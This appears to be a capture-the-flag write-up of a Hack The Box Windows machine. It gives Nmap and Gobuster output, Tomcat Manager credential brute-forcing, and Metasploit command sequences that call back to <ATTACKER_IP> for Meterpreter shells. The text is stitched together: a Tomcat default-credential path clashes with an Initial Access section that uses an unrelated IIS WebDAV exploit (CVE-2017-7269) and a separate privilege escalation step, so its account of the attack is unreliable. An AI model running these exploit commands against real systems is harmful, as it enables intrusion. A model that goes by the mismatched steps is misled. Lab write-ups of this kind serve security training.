**Difficulty:** Easy
**OS:** Windows
**Date Completed:** 2026-08-30
**Write-up Authored by:** Ian Simons
**Challenge Created by:** mrh4sh
**Core Competencies:**
- Network Enumeration with Nmap
- Vulnerability Research
- Brute Forcing with Metasploit
- Exlpoitation with Metasploit
- Web Enumeration with gobuster

---
## Overview
This Box was recommended by the Hack the Box Academy Job Role Path "Penetration Tester" in the "Getting Started" Module. The purpose of completing this box is to build familiarity with Metasploit. As we will see it did just that.
Note: Flags documented in Appendix B

---
## Vulnerability summary

| Vulnerability                                             | Vulnerability Classification                                                                                                     | CVSS Score | MITRE ATT&CK Technique        | ATT&CK Tactic     |
| --------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------- | ---------- | ----------------------------- | ----------------- |
| Weak/Guessable Password Apache Tomcat Manager Credentials | CWE - 521 - Weak Password Requirements<br>OWASP: A05 - Security Misconfigurations                                                | N/A        | T1110.001 - Password Guessing | Credential Access |
| Tomcat Manager accessible externally                      | CWE - 552 - Files/Functionality Exposed to Unauthorized Actors<br>OWASP: A05- Security Misconfigurations                         | N/A        | T1595 - Active Scanning       | Reconnaissance    |
| Missing Login rate-limiting on Tomcat Manager             | CWE - 307 - Improper Restriction of Excessive Authentication Attempts<br>OWASP: A07 - Identification and Authentication Failures | N/A        | T1110 - Brute Force           | Credential Access |


---
## Attack Path Summary
1. Performed network reconnaissance with **Nmap**, and identified **Apache Tomcat 7.0.88** on port **8080**.
2. Performed **Gobuster** scan and identified available **/manager** page which is a common security misconfiguration (**OWASP A05-Security Misconfiguration**)
3. Utilized **Metasploit Framework** module **auxiliary/scanner/http/tomcat_mgr_login** to brute force credentials. Exposed HTTP management portals are often vulnerable to Password Guessing attacks (**MITRE: T1110.001-Password Guessing**)
4. Successfully logged in with **tomcat:s3cret**, these are the demo credentials provided by documentation (**CWE-521-Weak Password Requirements**)
5. Leveraged the Metasploit module: **exploit/multi/http/tomcat_mgr_upload** to upload a malicious WAR file resulting in authenticated code execution and a **Meterpreter** session running as **NT AUTHORITY\SYSTEM**
---
## Reconnaissance
### Port Discovery
Nmap scan results
```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-30 13:53 EDT
Nmap scan report for 10.129.62.198
Host is up (0.0073s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 130.75 seconds

```
#### Key Open Ports and Services

A single exposed service was identified

| Port     | Service | Version              |
| -------- | ------- | -------------------- |
| 8080/TCP | HTTP    | Apache Tomcat 7.0.88 |

### Web Enumeration 
Upon navigating to the Web Application, the default Apache Tomcat page was present. A **Gobuster** scan yielded the results below. Notably the **/manager** page was identified. The **/manager** page is the Tomcat Manager Application, an administrative console that permits application deployment. Its exposure is a critical misconfiguration because valid credentials grant the ability to upload WAR files and execute arbitrary code on the server.
```
┌─[us-dedivip-3]─[10.10.14.169]─[n00blyfe@htb-6jlfvkttux]─[~]
└──╼ [★]$ gobuster dir -u http://10.129.62.198:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.62.198:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/manager              (Status: 302) [Size: 0] [--> /manager/]
/con                  (Status: 200) [Size: 0]
/http%3A%2F%2Fwww     (Status: 400) [Size: 0]
/http%3A%2F%2Fyoutube (Status: 400) [Size: 0]
/http%3A%2F%2Fblogs   (Status: 400) [Size: 0]
/http%3A%2F%2Fblog    (Status: 400) [Size: 0]
/**http%3A%2F%2Fwww   (Status: 400) [Size: 0]
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================

```
### Vulnerability Research
The availability of **/manager** page is a significant security misconfiguration (**OWASP: A05 - Security Misconfiguration**) that opens the service up to a password guessing attack (**MITRE: T1110.001 - Password Guessing**) 

---
## Initial Access
### Vulnerability Details
- Description: Default Credentials
- Vulnerability Classification: CWE-1329-Default Credentials, OWASP:A05-Security Misconfiguration.
- MITRE ATT&CK: Credential Access - T1078.001 - Default Credentials

The default credentials for Apache Tomcat were found to still be in use. 
#### Exploitation Steps
Based on the identified IIS 6.0 WebDAV service, the Metasploit module **exploit/windows/iis/iis_webdav_scstoragepathfromurl** was selected because it specifically targets CVE-2017-7269

1. Launch Metasploit framework
2. Select module **exploit/windows/iis/iis_webdav_scstoragepathfromurl** targeting CVE-2017-7269 
3. Configure target and callback parameters
4. Execute the exploit and obtain a remote session
#### Key Commands / Payloads
```
#launch Metasploit Framework console
msfconsole

#select appropriate exploit module
use exploit/windows/iis/iis_webdav_scstoragepathfromurl

#set appropriate options for module
set RHOST <TARGET_IP>
set RPORT 80
set LHOST <ATTACKER_IP>
set LPORT 4444

#run exploit
run
```

#### Proof of Access 
##### Screenshots
![img1](../../../Images/GrannyInitialAccess.jpg)
Figure 1: Proof of initial access. Successful exploitation of CVE-2017-7269 resulted in command execution on the target host. Session validated by confirming execution context, hostname, and operating system version.
##### Session Validation Commands
```
#Check user context
whoami.exe

#Verify target hostname
hostname

#Verify operating system version
 ver
```

---
## Privilege Escalation 
### Session Preparation
The Initial Meterpreter session was migrated to a more stable process prior to privilege escalation. Process migration improved session reliability and ensured compatibility with subsequent local exploitation modules. 
### Vulnerability Details
- Description: Microsoft Win32k Privilege Escalation Vulnerability
- CVE: CVE-2014-4113
- CVSS score: 7.8 (CVSS v3)
- MITRE ATT&CK: Privilege Escalation - T1068: Exploitation for Privilege Escalation

Microsoft Windows systems affected by CVE-2014-4113 are vulnerable to a Win32k privilege escalation flaw that can allow a local attacker to execute code with elevated privileges, potentially resulting in SYSTEM-level access. 
#### Exploitation Steps
1. Migrate the Meterpreter session to a more stable process
2. Move Meterpreter Session to background
3. Select Module **exploit/windows/local/ms14_058_track_popup_menu** 
4. Configure target session and callback parameters
5. Execute Exploit and obtain NT AUTHORITY\SYSTEM privileges
#### Key Commands / Payloads
```
#check current processes
ps

#Migrate process
migrate <TARGET_PROCESS>

#Background current session
[CTRL+z]

#Select appropriate module
use exploit/windows/local/ms14_058_track_popup_menu

#Configure module options
set SESSION <TARGET_SESSION>
set LHOST <ATTACKER_IP>
set LPORT 4444

#Run exploit
run

```

#### Proof of Privileges Escalation

![img](../../../Images/privEscwhomai.jpg)
Figure 2: Proof of Privilege Escalation. Successful exploitation of CVE-2014-4113 resulted in execution within the NT Authority\System security context. Privileges validated by confirming execution context with the whoami command.

---
## Lessons Learned 
The whole point of completing this Box was to build the fundamentals of using Metasploit. In that endeavor this Box was a complete success. There were absolutely some pain points along the way. However I now feel much more comfortable getting around the Metasploit Framework Console and utilizing a Meterpreter shell. Below are some key takeaways that hopefully can help others also attempting to solidify these fundamentals.
- Identifying a vulnerability before searching for an exploit is often more ifficient than searching for exploits first. Correlating discovered services with known CVEs can significantly narrow the research scope
- Initial access does not guarantee successful privilege escalation. Session preparation and stability can be the difference between success and failure
- Active exploitation can destabilize or crash services. Maintain thorough notes and documentation to ensure quick recovery if that happens
---
## Appendix
### Appendix A
#### Tools Used 
| Tool                 | Purpose                                                                       |
| -------------------- | ----------------------------------------------------------------------------- |
| Nmap                 | Network Reconnaissance, Service Discovery, and version detection              |
| SearchSploit         | Vulnerability research and exploit identification                             |
| Metasploit Framework | Exploitation, session management, post-exploitation, and privilege escalation |

### Appendix B
#### Flags found
![img](../../../Images/ActionsOnObjective.jpg)
User Flag:
700c\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*7d1

Root Flag:
aa4\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*6e9

### Appendix C
#### Supporting Evidence
No additional supporting evidence was required beyond the artifacts included throughout this write-up
